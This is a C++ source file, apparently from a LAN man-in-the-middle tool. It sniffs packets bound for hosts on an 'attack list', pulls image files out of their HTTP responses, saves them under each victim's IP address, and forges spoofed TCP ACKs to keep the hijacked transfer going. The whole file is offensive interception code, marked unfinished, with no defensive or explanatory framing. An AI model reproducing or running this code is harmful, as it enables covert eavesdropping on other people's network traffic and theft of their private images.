/*
Copyright (C) 2015  xfgryujk

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License along
with this program; if not, write to the Free Software Foundation, Inc.,
51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
*/

//  ImageReceive.cpp: implements receiving images and writes them to files.
//

#include "stdafx.h"
#include "ImageReceive.h"
#include "Packet.h"
#include <pcap.h>
#include "Helper.h"
#include "ThreadPool.h"
#include "NetManager.h"


bool ImageReceive::OnGatewayPacket(const pcap_pkthdr* header, const BYTE* pkt_data)
{
	const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
	// not TCP
	if (pIp->protocol != PROTOCOL_TCP)
		return true;
	DWORD ipLength = pIp->headerLen * 4;
	const TCPPacket* pTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
	Config& target = m_attackList[pIp->destinationIp];

	// is receiving
	if (target.receiveImageInfo.find(pTcp->destinationPort) != target.receiveImageInfo.end())
	{
		ReceiveImage(pIp->destinationIp, pTcp->destinationPort, header, pkt_data, false);
		return true;
	}

	// then check if we should receive

	DWORD tcpLength = pTcp->headerLen * 4;
	// not HTTP
	if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
		return true;

	LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
	LPCSTR contentType = strstr(http, "Content-Type: image/");
	// not image
	if (contentType == nullptr)
		return true;


	// receive image
	auto& receiveInfo = target.receiveImageInfo[pTcp->destinationPort];
	ReceiveImage(pIp->destinationIp, pTcp->destinationPort, header, pkt_data, true);
	return true;
}

ImageReceive::Config& ImageReceive::GetConfig(IpAddress ip)
{
	return m_attackList[ip];
}

// UNFINISHED!!
void ImageReceive::ReceiveImage(IpAddress targetIp, WORD targetPort, const pcap_pkthdr* header, const BYTE* pkt_data, bool isInit)
{
	UINT len = header->len;
	BYTE* data = new BYTE[len];
	memcpy(data, pkt_data, len);
	g_threadPool.AddTask([this, targetIp, targetPort, len, data, isInit]{
		//TRACE("receive image (%s:%u) start\n", (CString)targetIp, targetPort);
		std::unique_ptr<BYTE[]> curPkt(data);

		// get information
		Config& target = m_attackList[targetIp];
		auto it = target.receiveImageInfo.find(targetPort);
		if (it == target.receiveImageInfo.end())
		{
			// :( bad luck, we may have missed an image
			TRACE("image (%s:%u) missed\n", (CString)targetIp, targetPort);
			return;
		}
		auto& receiveInfo = it->second;
		IPPacket* pIp = (IPPacket*)&curPkt[ETH_LENGTH];
		DWORD ipLen = pIp->headerLen * 4;
		TCPPacket* pTcp = (TCPPacket*)&curPkt[ETH_LENGTH + ipLen];
		DWORD tcpLen = pTcp->headerLen * 4;

		// exception
		if (pTcp->rst)
		{
			TRACE("receive image (%s:%u) RST!\n", (CString)targetIp, targetPort);
			goto Release;
		}

		{ std::lock_guard<std::mutex> lock(receiveInfo.fileLock);
			// parse
			UINT filePos = ntohl(pTcp->seq) - receiveInfo.startSeq;
			char* pHttp = (char*)pTcp + tcpLen;
			UINT httpLen = (char*)curPkt.get() + len - pHttp;
			if (isInit) // is initial packet
			{
				// get content length
				char* pContentLength = strstr(pHttp, "Content-Length: ");
				if (pContentLength == nullptr) // it should exist!
					goto Release;
				pContentLength += 16;
				receiveInfo.restContentLen = atoi(pContentLength);
				if (receiveInfo.restContentLen <= 0) // it should exist!
					goto Release;
				TRACE("restContentLen = %d\n", receiveInfo.restContentLen);

				// discard the HTTP header
				char* pContent = strstr(pHttp, "\r\n\r\n");
				if (pContent != nullptr)
				{
					UINT headerLen = pContent + 4 - pHttp;
					pHttp = pContent + 4;

					// get seq
					receiveInfo.startSeq = ntohl(pTcp->seq) + headerLen;
					filePos = 0;
				}
			}

			// open file
			if (!receiveInfo.imageFile.is_open())
			{
				CreateDirs("image\\" + (CString)targetIp);
				DWORD time = GetTickCount();
				CString name;
				for (int i = 0; i < 10; i++)
				{
					name.Format("image\\%s\\%u.jpg", (CString)targetIp, time + i);
					receiveInfo.imageFile.open(name, std::ios::out | std::ios::trunc | std::ios::binary);
					if (receiveInfo.imageFile.is_open())
						break;
				}
				if (!receiveInfo.imageFile.is_open())
					return;
			}

			// write to file
			receiveInfo.imageFile.seekp(filePos, std::ios::beg);
			receiveInfo.imageFile.write(pHttp, httpLen);
			receiveInfo.restContentLen -= httpLen;
			TRACE("new restContentLen = %d\n", receiveInfo.restContentLen);
		}

		// response
		{
			AdapterHandle adapter(GetAdapterHandle());
			if (adapter == nullptr)
				return;

			std::unique_ptr<BYTE[]> ackPkt(new BYTE[ETH_LENGTH + ipLen + tcpLen]);
			*(MacAddress*)ackPkt.get() = g_netManager.m_gatewayMac;
			*(MacAddress*)(ackPkt.get() + 6) = g_netManager.m_selfMac;
			memcpy(ackPkt.get() + 12, curPkt.get() + 12, 2 + ipLen + tcpLen);
			IPPacket* pAckIp = (IPPacket*)(ackPkt.get() + ETH_LENGTH);
			pAckIp->identification = htons(ntohs(pAckIp->identification) + 1);
			pAckIp->totalLen = htons((WORD)(ipLen + tcpLen));
			pAckIp->timeToLive = 64;
			pAckIp->sourceIp = targetIp;
			pAckIp->destinationIp = pIp->sourceIp;
			pAckIp->CalcCheckSum();
			TCPPacket* pAckTcp = (TCPPacket*)(ackPkt.get() + ETH_LENGTH + ipLen);
			pAckTcp->sourcePort = targetPort;
			pAckTcp->destinationPort = pTcp->sourcePort;
			pAckTcp->seq = pTcp->ack;
			pAckTcp->ack = htonl(ntohl(pTcp->seq) + (len - ETH_LENGTH - ipLen - tcpLen));
			pAckTcp->psh = 0;
			pAckTcp->CalcCheckSum(pAckIp->sourceIp, pAckIp->destinationIp, (WORD)tcpLen);
			pcap_sendpacket(adapter.get(), (u_char*)ackPkt.get(), ETH_LENGTH + sizeof(IPPacket)+sizeof(TCPPacket));
		}

		// release
		if (receiveInfo.restContentLen <= 0)
		{
			TRACE("receive image (%s:%u) finish\n", (CString)targetIp, targetPort);
			goto Release;
		}
		/*else
			TRACE("receive image (%s:%u) end\n", (CString)targetIp, targetPort);*/
		return;

	Release:
		target.receiveImageInfo.erase(targetPort);
	});
}
